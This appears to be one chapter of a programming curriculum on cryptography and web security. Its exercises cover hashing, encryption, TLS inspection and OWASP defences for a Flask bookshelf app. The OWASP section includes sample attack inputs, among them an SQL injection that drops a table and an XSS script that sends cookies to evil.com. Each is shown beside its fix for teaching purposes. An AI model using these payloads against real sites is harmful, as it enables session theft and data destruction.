# Layer 6: Cryptography & Security

> **Goal**: Understand how crypto works under the hood. Harden MyBookShelf against real-world attacks.
> **Pre-req**: Layer 5 complete — deployed app with auth, TLS, microservices.
> **Why?** You've been *using* crypto (bcrypt, JWT, TLS) since Layer 3 without fully understanding it. Now we go deep. Security isn't a feature — it's a property of your entire system.

---

## Level 6.1 — Cryptography Foundations

### Questions to Answer First
1. What is the difference between encoding, encryption, and hashing?
2. What is symmetric encryption? Asymmetric? When do you use each?
3. What is a hash function? What properties make it "cryptographic"? (preimage resistance, collision resistance)
4. Why is MD5 broken but SHA-256 is not?
5. What is a digital signature? How is it different from encryption?
6. What is a key exchange? What is the Diffie-Hellman problem?

### Theory (Concise)
```
Encoding:  reversible, no key   (Base64, URL encoding)    — NOT security
Encryption: reversible, needs key (AES, RSA)               — Confidentiality
Hashing:   irreversible, no key  (SHA-256, bcrypt)         — Integrity, passwords

Symmetric: Same key to encrypt + decrypt (AES)
  Fast, used for bulk data. Problem: how to share the key?

Asymmetric: Public key encrypts, private key decrypts (RSA, Ed25519)
  Slow, used for key exchange + signatures.

TLS = Asymmetric (handshake, key exchange) + Symmetric (data transfer)
```

### Hands-On: Crypto with Python
```python
# file: mybookshelf/crypto_playground.py
import hashlib
import hmac
import base64
import os

# --- Hashing ---
message = b"Hello, Nithin!"

# SHA-256
sha256_hash = hashlib.sha256(message).hexdigest()
print(f"SHA-256: {sha256_hash}")
# Q: Hash "Hello, Nithin!" and "Hello, Nithin" — how different are the outputs?

# Q: Can you reverse a hash? Try to find the input from the output.

# --- HMAC (Hash-based Message Authentication Code) ---
# Like hashing, but with a secret key
secret = b"my-secret-key"
mac = hmac.new(secret, message, hashlib.sha256).hexdigest()
print(f"HMAC: {mac}")
# Q: JWT signatures use HMAC. Why is a key needed? Why not just hash?

# --- Symmetric Encryption (AES) ---
from cryptography.fernet import Fernet

# Generate a key
key = Fernet.generate_key()
print(f"Key: {key}")

# Encrypt
f = Fernet(key)
ciphertext = f.encrypt(b"My secret book list")
print(f"Encrypted: {ciphertext}")

# Decrypt
plaintext = f.decrypt(ciphertext)
print(f"Decrypted: {plaintext}")

# Q: What happens if you try to decrypt with a different key?

# --- Asymmetric Encryption (RSA) ---
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# Generate key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Encrypt with public key
ciphertext = public_key.encrypt(
    b"Secret message",
    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
)

# Decrypt with private key
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
)
print(f"RSA decrypted: {plaintext}")

# --- Digital Signatures ---
from cryptography.hazmat.primitives.asymmetric import utils

signature = private_key.sign(
    b"This message is from Nithin",
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)

# Verify with public key
try:
    public_key.verify(
        signature,
        b"This message is from Nithin",
        padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
        hashes.SHA256()
    )
    print("Signature VALID ✅")
except Exception:
    print("Signature INVALID ❌")

# Q: Modify the message and verify again. What happens?
```

```bash
pip install cryptography
python3 crypto_playground.py
```

---

## Level 6.2 — Password Security Deep Dive

### Questions to Answer First
1. Why hash passwords? Why not encrypt them?
2. What is a rainbow table? How does salt prevent it?
3. Why bcrypt/argon2 and not SHA-256 for passwords?
4. What is "work factor" / "cost factor"? Why does bcrypt get slower over time (on purpose)?
5. What is credential stuffing? How do you defend against it?

### Hands-On: Password Attacks & Defenses
```python
# file: mybookshelf/password_demo.py
import hashlib
import bcrypt
import time

password = "password123"

# --- Naive hashing (DO NOT USE) ---
sha_hash = hashlib.sha256(password.encode()).hexdigest()
print(f"SHA-256: {sha_hash}")
# Q: Google this hash. Can you find the original password?

# --- With salt (better, still not enough) ---
salt = "random_salt_value"
salted_hash = hashlib.sha256((salt + password).encode()).hexdigest()
print(f"Salted SHA-256: {salted_hash}")
# Q: Why is this still not good enough for passwords?

# --- bcrypt (correct approach) ---
start = time.time()
bcrypt_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
elapsed = time.time() - start
print(f"bcrypt: {bcrypt_hash} (took {elapsed:.3f}s)")
# Q: Why is slowness a FEATURE here?

# Verify
print(f"Verify: {bcrypt.checkpw(password.encode(), bcrypt_hash)}")

# --- Timing attack demo ---
# Q: Why should you use hmac.compare_digest() instead of == for comparing hashes?
import hmac
hash1 = b"abc123"
hash2 = b"abc124"
# == stops at first difference (timing leak)
# hmac.compare_digest compares in constant time (no leak)
print(f"Constant-time compare: {hmac.compare_digest(hash1, hash2)}")
```

---

## Level 6.3 — TLS/HTTPS Deep Dive

### Questions to Answer First
1. What does TLS actually protect? (confidentiality, integrity, authentication)
2. What is a certificate? What is a Certificate Authority (CA)?
3. What is the TLS handshake? What happens step by step?
4. What is Perfect Forward Secrecy? Why does it matter?
5. What is certificate pinning?

### Hands-On: Inspect TLS
```bash
# See the full TLS handshake
openssl s_client -connect example.com:443 -showcerts

# See certificate details
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text -noout

# Check your Hetzner site's TLS
echo | openssl s_client -connect yourdomain.com:443 2>/dev/null | openssl x509 -text -noout

# Generate a self-signed certificate (for learning)
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=localhost"

# Q: Why do browsers show a warning for self-signed certs?
```

### TLS Handshake Diagram
```
Client                              Server
  │                                    │
  │──── ClientHello (TLS version,  ───→│
  │     cipher suites, random)         │
  │                                    │
  │←─── ServerHello (chosen cipher, ───│
  │     certificate, random)           │
  │                                    │
  │  Client verifies certificate       │
  │  against trusted CAs               │
  │                                    │
  │──── Key Exchange (Diffie-Hellman) ─→│
  │                                    │
  │  Both derive shared secret         │
  │  (without ever sending it!)        │
  │                                    │
  │←──→ Encrypted communication ←──→   │
  │     (using symmetric AES)          │
```

---

## Level 6.4 — OWASP Top 10: Real-World Vulnerabilities

### Questions to Answer First
1. What is OWASP? What is the Top 10?
2. What is SQL injection? XSS? CSRF?
3. What is the principle of least privilege?
4. What is input validation? Where should it happen?

### Hands-On: Attack Your Own App

#### SQL Injection
```python
# VULNERABLE (DO NOT USE):
query = f"SELECT * FROM books WHERE title = '{user_input}'"
# If user_input = "'; DROP TABLE books; --"
# Query becomes: SELECT * FROM books WHERE title = ''; DROP TABLE books; --'

# SAFE:
cur.execute("SELECT * FROM books WHERE title = %s", (user_input,))
# Parameterized query — the DB driver handles escaping
```

#### Cross-Site Scripting (XSS)
```html
<!-- VULNERABLE: -->
<p>Welcome, {{ username | safe }}</p>
<!-- If username = <script>document.location='https://evil.com?cookie='+document.cookie</script> -->

<!-- SAFE (Jinja2 auto-escapes by default): -->
<p>Welcome, {{ username }}</p>
<!-- Output: Welcome, &lt;script&gt;...&lt;/script&gt; -->
```

#### Cross-Site Request Forgery (CSRF)
```html
<!-- Attacker's site has this hidden form: -->
<form action="https://mybookshelf.com/api/books/1/delete" method="POST">
    <input type="submit" value="Click here for free books!">
</form>
<!-- If user is logged in with cookies, the delete happens! -->

<!-- Defense: CSRF token -->
<!-- Each form includes a unique token that the attacker can't know -->
```

### Security Audit Checklist for MyBookShelf
```markdown
## Audit Checklist
- [ ] All SQL queries use parameterized statements
- [ ] All user input is validated (type, length, format)
- [ ] Passwords hashed with bcrypt (cost >= 12)
- [ ] JWT secret is strong and stored in environment variable
- [ ] HTTPS enforced (HTTP redirects to HTTPS)
- [ ] CORS configured correctly (not `*` in production)
- [ ] Rate limiting on login endpoint
- [ ] Error messages don't leak internal details
- [ ] Dependencies are up to date (no known CVEs)
- [ ] Sensitive data not in git (check .gitignore)
- [ ] HTTP security headers set (CSP, X-Frame-Options, etc.)
```

### Hands-On: Add Security Headers
```python
# Add to your Flask app
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

### Hands-On: Rate Limiting
```bash
pip install flask-limiter
```

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(get_remote_address, app=app, default_limits=["100 per hour"])

@app.route('/api/auth/login', methods=['POST'])
@limiter.limit("5 per minute")  # Q: Why limit login attempts?
def login():
    ...
```

---

## Level 6.5 — Practical Security Tools

### Hands-On: Scan Your App
```bash
# Check Python dependencies for known vulnerabilities
pip install safety
safety check -r requirements.txt

# Scan Docker image
docker scout cves mybookshelf:v1

# Check HTTP headers
curl -I https://yourdomain.com

# Nikto web scanner (on your own app only!)
sudo apt install nikto
nikto -h http://localhost:5000

# nmap port scan (your own server only!)
nmap -sV your-hetzner-ip
```

---

## Level 6.6 — SSH & GPG Key Management

### Questions to Answer First
1. How does SSH public-key auth work? Why is it better than passwords?
2. What is a GPG key? How is it used for git commit signing?
3. What is a key fingerprint? Why verify it?

### Hands-On
```bash
# Generate SSH key (Ed25519 — modern, fast, secure)
ssh-keygen -t ed25519 -C "nithin@mybookshelf"

# View public key
cat ~/.ssh/id_ed25519.pub

# Add to GitHub: Settings → SSH Keys → paste public key

# Generate GPG key for commit signing
gpg --full-generate-key
# Choose: RSA and RSA, 4096 bits

# List keys
gpg --list-secret-keys --keyid-format=long

# Configure git to sign commits
git config --global user.signingkey YOUR_KEY_ID
git config --global commit.gpgsign true
```

---

## Checkpoint Questions (Answer Before Moving to Layer 7)

1. Explain symmetric vs asymmetric encryption. Give a real-world use of each.
2. Why is bcrypt better than SHA-256 for passwords? Explain salting and work factor.
3. Walk through the TLS handshake from memory. What is Diffie-Hellman's role?
4. What is SQL injection? Write a vulnerable query and a safe query.
5. What is XSS? What is CSRF? How do you defend against each?
6. What HTTP security headers should every web app set?
7. Audit MyBookShelf: find 3 security improvements you would make.

---

**Previous**: [Layer 5 — Cloud & Microservices](layer5-cloud-microservices.md)
**Next**: [Layer 7 — ML, Deep Learning & LLMs](layer7-ml-dl-llms.md)
